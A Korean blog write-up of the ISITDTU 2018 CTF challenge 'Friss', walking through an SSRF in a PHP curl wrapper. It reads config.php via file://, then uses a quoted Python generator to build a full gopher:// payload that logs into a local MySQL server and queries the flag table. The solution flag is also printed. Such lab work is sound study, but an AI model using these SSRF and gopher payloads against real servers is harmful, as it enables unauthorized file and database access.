---
title: "[ISITDTU 2018] Friss Write up"
date: 2018-07-31
draft: false
category: [ctf]
subcategories: [2018]
tags: [Write-up, CTF, ISITDTU2018]
---

갑자기 CTF가 많으니까 풀어볼 문제가 많아졌다.
근데 다른사람이 작성한 Write-up 보고 문제를 보고 풀면 문제가 진짜 풀리고 배우는 점도 많아서 신난다.  
~~근데 또 새로운 문제 나오면 못풀겠지... 공부의 끝은 어디인가...~~
암튼 이번엔 `ISITDTU 2018`에 나왔던 `Friss`라는 문제를 풀어보았다.  

<!--more-->

문제 정보는 다음과 같다.  

```plain
http://35.190.142.60/
```

아무것도 없이 주소만 준다.
접속 해 보니까 또 아무것도 없이 입력창만 있다.  

![](/images/CTF/ISITDTU2018/friss/friss_01.png)  

소스코드를 보니까 저~~~아래에 작게 `<!-- index.php?debug=1-->`라고 써있다.
친절하게 소스코드를 제공해 줬다.

```php
<!DOCTYPE html> 
<html lang="en-US"> 
<head><title>REQUESTS PAGE</title> 
</head> 

<body> 

<?php 
include_once "config.php"; 
if (isset($_POST['url'])&&!empty($_POST['url'])) 
{ 
    $url = $_POST['url']; 
    $content_url = getUrlContent($url); 
} 
else 
{ 
    $content_url = ""; 
} 
if(isset($_GET['debug'])) 
{ 
    show_source(__FILE__); 
} 


?> 

<form action="index.php" method="POST"> 
<input name="url" type="text"> 
<input type="submit" value="CURL"> 
</form> 


<?php  

echo $content_url; 
?> 
</body> 

...

<!-- index.php?debug=1--> 
```

입력창에 url을 적으면 `getUrlContent`로 내용을 가져온다.
그래서 입력창에 `http://www.naver.com`을 적어 보았다.  

![](/images/CTF/ISITDTU2018/friss/friss_02.png)  

`localhost`만 된다고 한다.
그런데 분명히 `Only access to localhost`라는 문자열은 아까 확인 한 `index.php`에는 없었던 문자열이다.  

그래서 다시 소스코드를 살펴보니 `include_once "config.php";`라는 부분이 있다.
그럼 `config.php`라는 파일이 있다는 소리니, 이 파일을 살펴봐야 할 것 같다.
이 때 `file` 프로토콜을 사용하면 된다.
`index.php`에서는 딱히 프로토콜에 대한 제한은 없었으니, `file://127.0.0.1/var/www/html/config.php`를 하면 아마도 `config.php`의 내용을 볼 수 있을 것이다.  

```php
<!DOCTYPE html>
<html lang="en-US">
<head><title>REQUESTS PAGE</title>
</head>

<body>

curl 'file://127.0.0.1/var/www/html/config.php'
<form action="index.php" method="POST">
<input name="url" type="text">
<input type="submit" value="CURL">
</form>


<?php


$hosts = "localhost";
$dbusername = "ssrf_user";
$dbpasswd = "";
$dbname = "ssrf";
$dbport = 3306;

$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);

function initdb($conn)
{
	$dbinit = "create table if not exists flag(secret varchar(100));";
	if(mysqli_query($conn,$dbinit)) return 1;
	else return 0;
}

function safe($url)
{
	$tmpurl = parse_url($url, PHP_URL_HOST);
	if($tmpurl != "localhost" and $tmpurl != "127.0.0.1")
	{
		var_dump($tmpurl);
		die("<h1>Only access to localhost</h1>");
	}
	return $url;
}

function getUrlContent($url){
	$url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	echo $pl;
	$content = shell_exec($pl);
	return $content;
}
initdb($conn);
?>
</body>

...

<!-- index.php?debug=1-->
```

데이터베이스 설정 부분과 테이블을 초기화 하는 소스코드가 있고, `getUrlContent` 함수가 구현되어 있다.
`getUrlContent` 에서는 `curl 입력한 URL` 형태로 명령어를 만들어 `shell_exec`를 통해 실행 시켜 준다.
눈여겨 봐야 할 부분은 데이터베이스 설정 부분과 테이블 초기화 소스코드이다.  

```php
$hosts = "localhost";
$dbusername = "ssrf_user";
$dbpasswd = "";
$dbname = "ssrf";
$dbport = 3306;

$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);

function initdb($conn)
{
	$dbinit = "create table if not exists flag(secret varchar(100));";
	if(mysqli_query($conn,$dbinit)) return 1;
	else return 0;
}
```

살펴보면, 데이터베이스에 접속하기 위한 사용자의 아이디는 `ssrf_user`이며, 패스워드는 없다.
또한 데이터베이스의 이름은 `ssrf`이고, `initdb` 함수에서 `flag`라는 데이터베이스가 없다면 새로 생성하라고 했기 때문에 `ssrf` 데이터베이스에는 `flag`라는 테이블이 있다는 것을 알 수 있다.
이름도 `flag`이니, 아마 여기에 flag가 있을 것 같다.  
`select * from ssrf.flag;`를 쿼리를 실행시킬수만 있다면 문제를 짠! 하고 풀 수 있을 것이다.

여기까진 알아낼만 했는데, 문제는 이제부터이다.
도대체 저 정보만 가지고 어떻게 쿼리를 실행시킬 수 있는 것인가.
Write-up을 보니 다들 `gopher`라는 프로토콜을 사용했다.  

#### gopher 프로토콜  
```
인터넷을 위해 고안된 문서 검색 프로토콜  
```

`gopher` 프로토콜이 만들어진 취지는 위와 같다.
`http` 프로토콜에서는 헤더나 기타 URL 인코딩 데이터를 제어할 수 없지만, `gopher`를 사용하면, 전송 된 모든 바이트를 제어할 수 있기 때문에 이 `gopher` 프로토콜을 이용하면 `MySQL`에 요청을 보낼 수 있다고 한다.
요청을 보내는 방법은 생각보다 간단하다.  

1. Wireshark를 통해 MySQL에 로그인 하는 패킷 캡쳐  
2. 해당 패킷을 바탕으로 gopher 프로토콜 요청 페이로드 작성  

페이로드 작성은 친절하게도 이미 누군가가 파이썬 코드를 작성 해 올려두었다.  

> [https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py](https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py)

```python
dump = raw_input("Give connection packet of mysql: ")
query = raw_input("Give query to execute: ")

auth = dump.replace("\n","")

def encode(s):
    a = [s[i:i + 2] for i in range(0, len(s), 2)]
    return "gopher://127.0.0.1:3306/_%" + "%".join(a)


def get_payload(query):
    if(query.strip()!=''):
    	query = query.encode("hex")
    	query_length = '{:x}'.format((int((len(query) / 2) + 1)))
    	pay1 = query_length.rjust(2,'0') + "00000003" + query
    	final = encode(auth + pay1 + "0100000001")
    	return final
    else:
	return encode(auth)

print "\nYour gopher link is ready to do SSRF : \n"
print get_payload(query)
```

그럼 이제 내가 할 것은 MySQL 로그인 패킷을 잡는 것이다.
이 패킷을 잡으려면 `lo`라는 자신에게 송수신하는 루프백 네트워크 디바이스의 패킷을 잡아야 한다.

`tcpdump`로도 잡을 수 있지만, 나는 `Wireshark`를 사용하기로 했다.
Ubuntu Desktop 버전에서 `apt-get install wireshark` 하면 다운받을 수 있다. ~~데스크탑 버전 안쓰는데 이거 때문에 새로 설치함~~
`Wireshark`를 실행시킨 후 `Loopback: lo`를 선택한다.
이 후 새로운 터미널을 열어서 아래와 같이 입력한다.  

```plain
mysql -h 127.0.0.1 -u ssrf_user
```

앞서 `config.php` 파일에서 본 `MySQL` 사용자의 이름이 `ssrf_user`이기 때문에 `-u ssrf_user`를 입력 해 주었다.
그런데 우리는 `요청하는 패킷`만 필요할 뿐, 응답은 필요없기 때문에 로그인에 성공하지 않아도 된다.
Wireshark에 패킷이 잡혀있을텐데, 그 중 `MySQL` 프로토콜에서 `Login Request`라고 써진 패킷을 잡아보면 아래와 같을 것이다.  

![](/images/CTF/ISITDTU2018/friss/friss_03.png)  

해당 패킷에서 `마우스 오른쪽 버튼` > `Follow` > `TCP Stream`을 선택하면 아래와 같다.  

![](/images/CTF/ISITDTU2018/friss/friss_04.png)  

이 데이터를 하단에 `Show and save data as`를 `ASCII` 에서 `RAW`로 변경 해 주면 아래와 같이 raw data를 얻을 수 있다.  

![](/images/CTF/ISITDTU2018/friss/friss_05.png)  

위의 블록으로 지정한 부분이 MySQL에서 Login을 요청하는 Raw data가 된다.
이제 해당 내용을 복사 해 앞서 구한 파이썬 스크립트에 넣으면 `gopher` 프로토콜을 사용 한 `Request` 내용을 알려 줄 것이다.  

```sh
$ python ex.py 
Give connection packet of mysql: a800000185a6ff0100000001210000000000000000000000000000000000000000000000737372665f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f7069640537313730320f5f636c69656e745f76657273696f6e06352e372e3233095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c
Give query to execute: select * from ssrf.flag;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%73%73%72%66%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%37%31%37%30%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%33%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%73%73%72%66%2e%66%6c%61%67%3b%01%00%00%00%01
```

마지막에 나온 내용을 복사 해 문제의 입력 창에 넣으면 아래와 같이 flag를 얻을 수 있다.  

![](/images/CTF/ISITDTU2018/friss/friss_06.png)  

```plain
FLAG : ISITDTU{JUST_4_SSrF_B4B3!!}
```
